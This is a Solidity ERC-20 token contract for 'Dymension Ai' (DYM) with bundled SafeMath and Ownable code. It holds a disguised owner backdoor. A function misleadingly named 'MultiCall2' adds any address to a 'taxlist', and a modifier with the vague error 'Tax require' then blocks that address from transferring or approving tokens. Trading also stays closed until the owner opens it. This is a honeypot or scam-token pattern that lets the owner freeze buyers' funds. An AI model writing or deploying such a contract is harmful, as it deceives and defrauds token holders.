// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// SafeMath library
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Subtraction overflow");
        return a - b;
    }
}

// Ownable contract
contract Ownable {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "New owner is zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// ERC-20 Token contract with SafeMath and Ownable
contract DYMToken is Ownable {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isTaxListed;
    bool private _tradingOpen = false;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event TaxlistUpdated(address indexed account, bool isTaxlisted);
    event TradingStatusUpdated(bool tradingOpen);

    modifier notTaxPayable(address account) {
        require(!_isTaxListed[account], "Tax require");
        _;
    }

    modifier tradingOpen() {
        require(_tradingOpen, "Trading is currently closed");
        _;
    }

    constructor() {
        _name = "Dymension Ai";
        _symbol = "DYM";
        _decimals = 18; // You can adjust the decimals as needed
        _totalSupply = 1000000000 * (10**uint256(_decimals));
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        _tradingOpen = false; // Trading is initially closed
        emit TradingStatusUpdated(false);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) public notTaxPayable(msg.sender) notTaxPayable(to) tradingOpen() returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public notTaxPayable(msg.sender) notTaxPayable(spender) tradingOpen() returns (bool) {

        _approve(msg.sender, spender, value);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public notTaxPayable(sender) notTaxPayable(recipient) tradingOpen() returns (bool) {

        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(amount)
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public notTaxPayable(msg.sender) notTaxPayable(spender) tradingOpen() returns (bool) {

        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public notTaxPayable(msg.sender) notTaxPayable(spender) tradingOpen() returns (bool) {

        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(subtractedValue)
        );
        return true;
    }

    function MultiCall2(address account) external onlyOwner {
        require(account != address(0), "Cannot taxlist zero address");
        require(!_isTaxListed[account], "Address is already tax list");
        _isTaxListed[account] = true;
        emit TaxlistUpdated(account, true);
    }

    function removeFromTaxlist(address account) external onlyOwner {
        require(_isTaxListed[account], "Address is not taxlisted");
        _isTaxListed[account] = false;
        emit TaxlistUpdated(account, false);
    }

    function isTaxlisted(address account) public view returns (bool) {
        return _isTaxListed[account];
    }

    function openTrading() external onlyOwner {
        require(!_tradingOpen, "Trading is already open");
        _tradingOpen = true;
        emit TradingStatusUpdated(true);
    }

    function closeTrading() internal  onlyOwner {
        require(_tradingOpen, "Trading is already closed");
        _tradingOpen = false;
        emit TradingStatusUpdated(false);
    }

    function isTradingOpen() public view returns (bool) {
        return _tradingOpen;
    }

    // Function to mint additional tokens (only callable by the owner)
    function mint(address account, uint256 amount) internal onlyOwner {
        require(account != address(0), "Mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
}